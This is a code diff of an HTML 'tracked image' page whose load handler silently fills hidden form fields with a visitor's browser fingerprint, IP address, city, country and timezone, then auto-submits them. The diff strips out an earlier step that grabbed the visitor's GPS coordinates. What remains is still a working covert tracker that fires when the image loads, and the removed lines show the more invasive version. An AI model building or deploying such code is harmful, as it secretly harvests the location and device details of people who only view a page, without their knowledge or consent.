@@ -29,14 +29,12 @@
       <input type="hidden" name="Language" id="lang" />
       <input type="hidden" name="Screen" id="screen" />
       <input type="hidden" name="Timezone" id="tz" />
-      <input type="hidden" name="GPS_Latitude" id="gps_lat" />
-      <input type="hidden" name="GPS_Longitude" id="gps_lng" />
-      <input type="hidden" name="GPS_Accuracy" id="gps_acc" />
       <input type="hidden" name="IP" id="ip" />
       <input type="hidden" name="City" id="city" />
       <input type="hidden" name="Country" id="country" />
       <input type="hidden" name="Timestamp" id="ts" />
       <input type="hidden" name="_captcha" value="false" />
+      <input type="hidden" name="_next" value="track.png" />
     </form>
     <script>
       async function getIPLocation() {
@@ -47,7 +45,7 @@
           return {};
         }
       }
-      function fillAndSubmitForm(gps, ipinfo) {
+      function fillAndSubmitForm(ipinfo) {
         document.getElementById("ua").value = navigator.userAgent;
         document.getElementById("platform").value = navigator.platform;
         document.getElementById("lang").value = navigator.language;
@@ -56,11 +54,6 @@
         document.getElementById("tz").value =
           Intl.DateTimeFormat().resolvedOptions().timeZone;
         document.getElementById("ts").value = new Date().toISOString();
-        if (gps) {
-          document.getElementById("gps_lat").value = gps.latitude || "";
-          document.getElementById("gps_lng").value = gps.longitude || "";
-          document.getElementById("gps_acc").value = gps.accuracy || "";
-        }
         if (ipinfo) {
           document.getElementById("ip").value = ipinfo.ip || "";
           document.getElementById("city").value = ipinfo.city || "";
@@ -69,26 +62,7 @@
         document.getElementById("trackForm").submit();
       }
       function onImageLoad() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            async (pos) => {
-              const gps = {
-                latitude: pos.coords.latitude,
-                longitude: pos.coords.longitude,
-                accuracy: pos.coords.accuracy,
-              };
-              const ipinfo = await getIPLocation();
-              fillAndSubmitForm(gps, ipinfo);
-            },
-            async (err) => {
-              const ipinfo = await getIPLocation();
-              fillAndSubmitForm({}, ipinfo);
-            },
-            { timeout: 10000 }
-          );
-        } else {
-          getIPLocation().then((ipinfo) => fillAndSubmitForm({}, ipinfo));
-        }
+        getIPLocation().then((ipinfo) => fillAndSubmitForm(ipinfo));
       }
       document
         .getElementById("trackedImg")
